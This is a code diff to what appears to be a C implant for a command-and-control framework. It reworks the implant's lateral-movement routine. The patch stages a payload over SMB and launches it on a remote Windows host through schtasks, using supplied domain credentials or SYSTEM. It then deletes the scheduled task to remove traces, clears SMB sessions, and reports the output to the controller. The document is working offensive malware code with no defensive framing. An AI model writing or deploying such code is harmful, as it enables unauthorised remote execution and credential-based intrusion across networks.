@@ -2001,6 +2001,11 @@ static const char *smb_stage(const char *host, const char *name,
     char net_cmd[1024];
     FILE *f;
 
+    /* Drop any implicit machine-account session first to avoid error 3775
+     * when adding explicit credentials on a type-3 (network logon) token. */
+    snprintf(net_cmd, sizeof(net_cmd), "net use \\\\%s /delete /y 2>nul", host);
+    system(net_cmd);
+
     /* Authenticate */
     if (user && user[0] && pass) {
         snprintf(net_cmd, sizeof(net_cmd),
@@ -4397,25 +4402,40 @@ void dispatch_task(AgentTask *task) {
             free(payload_data);
             if (!remote_path_wmi) { smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"","wmi: SMB staging failed"); return; }
 
-            char wmi_cmd[1024];
+            /* Use schtasks with explicit domain-user credentials so the child
+             * runs as the provided account (not SYSTEM/machine-account), enabling
+             * cross-domain named-pipe auth back to the parent. */
+            char wmi_at[8]; runas_start_time(wmi_at, sizeof(wmi_at));
+            char sch_create[1536], sch_run[512], sch_del[256];
             if (lat_user[0] && lat_pass[0]) {
-                char dom[128]={0}, usr[128]={0};
-                const char *bs = strchr(lat_user, '\\');
-                if (bs) { strncpy(dom, lat_user, (size_t)(bs-lat_user)); strncpy(usr, bs+1, sizeof(usr)-1); }
-                else { strcpy(dom, "."); strncpy(usr, lat_user, sizeof(usr)-1); }
-                snprintf(wmi_cmd, sizeof(wmi_cmd),
-                    "wmic /node:\"%s\" /user:\"%s\\%s\" /password:\"%s\" process call create \"%s\" 2>&1",
-                    lat_host, dom, usr, lat_pass, remote_path_wmi);
+                snprintf(sch_create, sizeof(sch_create),
+                    "schtasks /Create /S \"%s\" /U \"%s\" /P \"%s\" /RU \"%s\" /RP \"%s\""
+                    " /SC ONCE /ST %s /F /TN \"%s\" /TR \"%s\" 2>&1",
+                    lat_host, lat_user, lat_pass, lat_user, lat_pass,
+                    wmi_at, svc_name, remote_path_wmi);
+                snprintf(sch_run, sizeof(sch_run),
+                    "schtasks /Run /S \"%s\" /U \"%s\" /P \"%s\" /TN \"%s\" 2>&1",
+                    lat_host, lat_user, lat_pass, svc_name);
+                snprintf(sch_del, sizeof(sch_del),
+                    "schtasks /Delete /S \"%s\" /U \"%s\" /P \"%s\" /TN \"%s\" /F 2>&1",
+                    lat_host, lat_user, lat_pass, svc_name);
             } else {
-                snprintf(wmi_cmd, sizeof(wmi_cmd),
-                    "wmic /node:\"%s\" process call create \"%s\" 2>&1", lat_host, remote_path_wmi);
+                snprintf(sch_create, sizeof(sch_create),
+                    "schtasks /Create /S \"%s\" /RU SYSTEM /SC ONCE /ST %s /F /TN \"%s\" /TR \"%s\" 2>&1",
+                    lat_host, wmi_at, svc_name, remote_path_wmi);
+                snprintf(sch_run, sizeof(sch_run),
+                    "schtasks /Run /S \"%s\" /TN \"%s\" 2>&1", lat_host, svc_name);
+                snprintf(sch_del, sizeof(sch_del),
+                    "schtasks /Delete /S \"%s\" /TN \"%s\" /F 2>&1", lat_host, svc_name);
             }
-            char *wmi_out = run_shell(wmi_cmd);
+            char *cr_out = run_shell(sch_create);
+            char *rn_out = run_shell(sch_run);
+            char *dl_out = run_shell(sch_del); free(dl_out);
             smb_stage_cleanup(lat_host, lat_user);
-            char res_wmi[1024];
-            snprintf(res_wmi, sizeof(res_wmi), "[+] wmi → %s\n    path: %s\n%s",
-                lat_host, remote_path_wmi, wmi_out?wmi_out:"");
-            free(wmi_out);
+            char res_wmi[1536];
+            snprintf(res_wmi, sizeof(res_wmi), "[+] wmi → %s\n    path: %s\n%s\n%s",
+                lat_host, remote_path_wmi, cr_out?cr_out:"", rn_out?rn_out:"");
+            free(cr_out); free(rn_out);
             agent_send_result(task->id, res_wmi, "");
 
         } else if (_stricmp(lat_method, "smbexec") == 0) {
